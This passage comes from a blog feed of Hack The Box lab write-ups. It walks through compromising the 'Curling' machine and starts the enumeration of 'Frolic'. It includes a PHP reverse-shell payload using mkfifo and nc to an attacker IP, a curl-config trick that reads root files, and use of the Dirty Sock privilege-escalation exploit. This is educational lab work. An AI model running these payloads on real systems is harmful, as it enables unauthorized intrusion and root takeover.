&lt;h4 id=&quot;curling2018-we-can-use-that-as-a-password-but-what-is-the-username--if-we-take-a-look-at-the-main-page-again-and-read-the-posts-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Curling2018!&lt;/code&gt; we can use that as a password. But what is the username ? If we take a look at the main page again and read the posts :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-notice-a-name-in-one-of-the-posts--floris--now-we-can-try-to-login-as-floris-with-the-password-curling2018-&quot;&gt;We will notice a name in one of the posts : &lt;code class=&quot;highlighter-rouge&quot;&gt;Floris&lt;/code&gt; , now we can try to login as &lt;code class=&quot;highlighter-rouge&quot;&gt;floris&lt;/code&gt; with the password &lt;code class=&quot;highlighter-rouge&quot;&gt;Curling2018!&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/curling/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-it-worked-while-i-was-doing-this-enumeration-i-ran-gobuster-in-the-background-and-got-these-results-&quot;&gt;And it worked. While I was doing this enumeration I ran gobuster in the background and got these results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/.htpasswd (Status: 403)
/.hta (Status: 403)
/administrator (Status: 301)
/.htaccess (Status: 403)
/bin (Status: 301)
/cache (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/templates (Status: 301)
/tmp (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-go-to-administrator-and-login-to-the-administration-panel-&quot;&gt;Let’s go to &lt;code class=&quot;highlighter-rouge&quot;&gt;/administrator&lt;/code&gt; and login to the administration panel :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/9.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/curling/10.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/curling/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;editing-template-files-and-getting-a-reverse-shell-&quot;&gt;Editing Template Files and Getting a Reverse Shell :&lt;/h3&gt;
&lt;h4 id=&quot;on-the-configuration-section-theres-an-option-for-templates-&quot;&gt;On the configuration section there’s an option for templates :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-going-to-that-we-notice-that-protostar-is-the-default-style-and-template-&quot;&gt;By going to that we notice that protostar is the default style and template :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/13.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/curling/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;from-templates-we-will-go-to-protostar-details-and-files-and-create-a-new-php-file-&quot;&gt;From templates we will go to &lt;code class=&quot;highlighter-rouge&quot;&gt;Protostar Details and Files&lt;/code&gt; and create a new &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/15.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/curling/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-the-php-file-we-will-execute-a-system-command-to-get-a-reverse-shell-&quot;&gt;In the php file we will execute a system command to get a reverse shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f');
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-we-save-the-file-we-will-go-to-httpcurlinghtbtemplatesprotostarfilephp&quot;&gt;After we save the file we will go to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://curling.htb/templates/protostar/file.php&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-check-our-listener-&quot;&gt;Then we check our listener :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;user&quot;&gt;User&lt;/h3&gt;
&lt;h4 id=&quot;we-got-a-reverse-shell-as-www-data--in-the-home-directory-theres-a-directory-for-floris-&quot;&gt;We got a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; , in the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory there’s a directory for &lt;code class=&quot;highlighter-rouge&quot;&gt;floris&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-dont-have-read-access-to-usertxt--but-we-notice-a-file-called-password_backup--by-looking-at-that-file-&quot;&gt;We don’t have read access to &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; , but we notice a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;password_backup&lt;/code&gt; , by looking at that file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-a-hex-dump-file--so-i-copied-it-to-my-box-to-reverse-it-&quot;&gt;It’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;hex dump&lt;/code&gt; file , So I copied it to my box to reverse it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-reverse-a-hex-dump-file-we-will-use-xxd--so-xxd--r-pw_backup-&quot;&gt;To reverse a &lt;code class=&quot;highlighter-rouge&quot;&gt;hex dump&lt;/code&gt; file we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;xxd&lt;/code&gt; , so &lt;code class=&quot;highlighter-rouge&quot;&gt;xxd -r pw_backup&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;not-a-normal-output--lets-redirect-the-output-to-a-file-and-see-&quot;&gt;Not a normal output , let’s redirect the output to a file and see :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-what-happened-is--it-turned-out-to-be-a-bzip2-file-so-i-decompressed-it-then-got-a-new-gzip-file--decompressed-it-and-got-another-bzip2-file--after-decompression-i-got-a-tar-file--then-finally-a-txt-file-for-the-password-&quot;&gt;So what happened is , it turned out to be a &lt;code class=&quot;highlighter-rouge&quot;&gt;bzip2&lt;/code&gt; file so I decompressed it then got a new &lt;code class=&quot;highlighter-rouge&quot;&gt;gzip&lt;/code&gt; file , decompressed it and got another &lt;code class=&quot;highlighter-rouge&quot;&gt;bzip2&lt;/code&gt; file , after decompression I got a &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt; file , then finally a &lt;code class=&quot;highlighter-rouge&quot;&gt;txt&lt;/code&gt; file for the password :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-ssh-as-floris-&quot;&gt;Let’s &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;floris&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;curling&quot;&gt;Curling&lt;/h3&gt;
&lt;h4 id=&quot;by-looking-at-the-home-directory-of-floris-again-&quot;&gt;By looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;floris&lt;/code&gt; again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-a-directory-called-admin-area-which-contains-two-files-&quot;&gt;There’s a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;admin-area&lt;/code&gt; which contains two files :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;input-and-report&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;report&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;input-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;url--http127001&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;url = &quot;http://127.0.0.1&quot;&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;report-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;report&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-obvious-that-this-is-the-output-of-executing-curl-on-http127001-&quot;&gt;It’s obvious that this is the output of executing &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;http://127.0.0.1&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;even-the-name-of-the-box-is-a-hint-curling--so-what-about-changing-that-url-from-localhost-to-something-else-like-a-file--next-time-the-command-gets-executed-we-will-get-the-contents-of-that-file--maybe-roottxt--but-only-if-its-getting-executed-by-root-lets-try-and-see-if-it-will-work-&quot;&gt;Even the name of the box is a hint &lt;code class=&quot;highlighter-rouge&quot;&gt;curling&lt;/code&gt; , so what about changing that &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost&lt;/code&gt; to something else like a file ? Next time the command gets executed we will get the contents of that file , maybe &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; ? But only if it’s getting executed by &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;. Let’s try and see if it will work :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-do--watch-cat-report--this-is-executing-cat-report-every-2-seconds-and-giving-us-the-output--easier-than-checking-manually-&quot;&gt;Then we will do : &lt;code class=&quot;highlighter-rouge&quot;&gt;watch cat report&lt;/code&gt; , this is executing &lt;code class=&quot;highlighter-rouge&quot;&gt;cat report&lt;/code&gt; every 2 seconds and giving us the output , easier than checking manually :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-some-time-we-get-the-flag&quot;&gt;After some time we get the flag.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;dirty-sock--root-shell-&quot;&gt;Dirty Sock ? Root shell !&lt;/h3&gt;
&lt;h4 id=&quot;i-didnt-like-the-fact-that-i-could-only-read-the-flag--i-wanted-a-root-shell-so-i-tried-for-a-long-time-to-bypass-the-url-thing-and-get-a-reverse-shell--but-couldnt-then-when-i-did-this-box-again-for-the-write-up--one-of-the-things-that-caught-my-attention-is-that-we-are-on-an-ubuntu-box--so-i-checked-snap-version-to-know-if-its-vulnerable-to-cve-2019-7304-known-as-dirty-sock-and-of-course-it-was-&quot;&gt;I didn’t like the fact that I could only read the flag , I wanted a &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; shell. So I tried for a long time to bypass the &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt; thing and get a reverse shell , but couldn’t. Then when I did this box again for the write-up , one of the things that caught my attention is that we are on an &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; box , so I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;snap&lt;/code&gt; version to know if it’s vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2019-7304&lt;/code&gt; known as &lt;code class=&quot;highlighter-rouge&quot;&gt;Dirty Sock&lt;/code&gt; and of course it was :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-is-not-intended-at-all-because-by-the-time-this-box-was-released---cve-2019-7304-wasnt-disclosed-yet&quot;&gt;This is not intended at all because by the time this box was released ,  &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2019-7304&lt;/code&gt; wasn’t disclosed yet.&lt;/h4&gt;
&lt;h4 id=&quot;i-got-the-exploit-from-here--then-hosted-it-on-a-python-simple-http-server-and-downloaded-it-on-the-box-&quot;&gt;I got the exploit from &lt;a href=&quot;https://github.com/initstring/dirty_sock&quot;&gt;here&lt;/a&gt; , Then hosted it on a python simple http server and downloaded it on the box :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/35.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;python3 dirty_sockv2.py&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/curling/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-su-to-dirty_sock-and-execute-commands-as-root-&quot;&gt;Now we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;dirty_sock&lt;/code&gt; and execute commands as root :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;or-just-sudo-su-and-we-will-get-a-root-shell-&quot;&gt;Or just &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; and we will get a root shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-root-&quot;&gt;We owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---frolic&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/frolic/&quot;&gt;Hack The Box - Frolic&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---vault&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/vault/&quot;&gt;Hack The Box - Vault&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Curling retired and here is my write-up about it. I had a lot of fun doing this box as it was easy and simple. Also it was straightforward , no rabbit holes and such things. It’s a linux box and its ip is 10.10.10.150 I added it to /etc/hosts as curling.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC curling.htb We only get 2 open ports , 80 running http and 22 running ssh. Let’s look at http. HTTP Initial Enumeration We see a blog titled “Cewl Curling site!” , and it’s joomla. At this point I would run joomscan but I wanted to do some manual enumeration first , so I checked the source of the page and at the end of the body I found this comment : So I checked /secret.txt and found this base64 string : Decoding : Curling2018! we can use that as a password. But what is the username ? If we take a look at the main page again and read the posts : We will notice a name in one of the posts : Floris , now we can try to login as floris with the password Curling2018! : And it worked. While I was doing this enumeration I ran gobuster in the background and got these results : /.htpasswd (Status: 403) /.hta (Status: 403) /administrator (Status: 301) /.htaccess (Status: 403) /bin (Status: 301) /cache (Status: 301) /components (Status: 301) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /server-status (Status: 403) /templates (Status: 301) /tmp (Status: 301) Let’s go to /administrator and login to the administration panel : Editing Template Files and Getting a Reverse Shell : On the configuration section there’s an option for templates : By going to that we notice that protostar is the default style and template : From templates we will go to Protostar Details and Files and create a new php file : In the php file we will execute a system command to get a reverse shell : &amp;lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f'); ?&amp;gt; After we save the file we will go to http://curling.htb/templates/protostar/file.php Then we check our listener : User We got a reverse shell as www-data , in the /home directory there’s a directory for floris : We don’t have read access to user.txt , but we notice a file called password_backup , by looking at that file : It’s a hex dump file , So I copied it to my box to reverse it : To reverse a hex dump file we will use xxd , so xxd -r pw_backup : Not a normal output , let’s redirect the output to a file and see : So what happened is , it turned out to be a bzip2 file so I decompressed it then got a new gzip file , decompressed it and got another bzip2 file , after decompression I got a tar file , then finally a txt file for the password : Let’s ssh as floris : And we owned user ! Curling By looking at the /home directory of floris again : There’s a directory called admin-area which contains two files : input and report input : url = &quot;http://127.0.0.1&quot; report : It’s obvious that this is the output of executing curl on http://127.0.0.1 : Even the name of the box is a hint curling , so what about changing that url from localhost to something else like a file ? Next time the command gets executed we will get the contents of that file , maybe root.txt ? But only if it’s getting executed by root. Let’s try and see if it will work : Then we will do : watch cat report , this is executing cat report every 2 seconds and giving us the output , easier than checking manually : After some time we get the flag. Dirty Sock ? Root shell ! I didn’t like the fact that I could only read the flag , I wanted a root shell. So I tried for a long time to bypass the url thing and get a reverse shell , but couldn’t. Then when I did this box again for the write-up , one of the things that caught my attention is that we are on an ubuntu box , so I checked snap version to know if it’s vulnerable to CVE-2019-7304 known as Dirty Sock and of course it was : This is not intended at all because by the time this box was released , CVE-2019-7304 wasn’t disclosed yet. I got the exploit from here , Then hosted it on a python simple http server and downloaded it on the box : python3 dirty_sockv2.py Now we can su to dirty_sock and execute commands as root : Or just sudo su and we will get a root shell : We owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Frolic Next Hack The Box write-up : Hack The Box - Vault</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/curling/0.png" /></entry><entry><title type="html">Hack The Box - Frolic</title><link href="http://localhost:4000/hack-the-box/frolic/" rel="alternate" type="text/html" title="Hack The Box - Frolic" /><published>2019-03-23T00:00:00+02:00</published><updated>2019-03-23T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/frolic</id><content type="html" xml:base="http://localhost:4000/hack-the-box/frolic/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-frolic-retired-and-here-is-my-write-up-about-it-this-box-was-more-of-a-ctf-challenge-than-a-real-world-scenario--especially-the-user-part--but-it-was-nice-because-for-root-we-will-exploit-a-buffer-overflow-vulnerability-its-a-linux-box-and-its-ip-is-101010111--i-added-it-to-etchosts-as-frolichtb-lets-jump-right-in-&quot;&gt;Hey guys today frolic retired and here is my write-up about it. This box was more of a CTF challenge than a real world scenario , especially the user part , But it was nice because for root we will exploit a buffer overflow vulnerability. It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.111&lt;/code&gt; , I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;frolic.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sc frolic.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/frolic/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-ssh-on-port-22--smb-on-port-139-and-445-which-is-not-a-usual-thing-to-see-on-a-linux-box-and-http-on-port-9999-we-will-take-a-look-at-http-first&quot;&gt;We got ssh on port 22 , smb on port 139 and 445 (which is not a usual thing to see on a linux box) and http on port 9999. We will take a look at http first.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-visiting-port-9999-we-get-the-welcome-page-of-nginx--so-we-will-use-gobuster-to-enumerate-sub-directories-&quot;&gt;By visiting port 9999 we get the welcome page of nginx , so we will use gobuster to enumerate sub directories :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://frolic.htb:9999/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/03/22 12:53:58 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin (Status: 301)
/backup (Status: 301)
/dev (Status: 301)
/test (Status: 301)
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-admin--backup--dev-and-test&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;/backup&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/test&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;backup-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/backup&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;dev-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-403-on-dev--lets-run-gobuster-again-on-dev-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt; , let’s run gobuster again on &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://frolic.htb:9999/dev/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/03/22 17:51:41 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/backup (Status: 301)
/test (Status: 200)
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-backup-and-test&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;/backup&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/test&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;devbackup-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/backup&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;playsms--lets-check-that-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/playsms&lt;/code&gt; , Let’s check that :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-asks-for-authentication--we-will-get-back-to-it-later-when-we-find-any-credentials-so-that-was-for-dev&quot;&gt;It asks for authentication , we will get back to it later when we find any credentials. So that was for &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;test-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/test&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-just-the-phpinfo-page&quot;&gt;It’s just the &lt;code class=&quot;highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt; page&lt;/h4&gt;
&lt;h4 id=&quot;admin-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/frolic/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;on-admin-theres-an-authentication-form--and-the-title-is-cmon-i-m-hackable-d&quot;&gt;on &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin&lt;/code&gt; there’s an authentication form , and the title is “c’mon i m hackable” :D&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

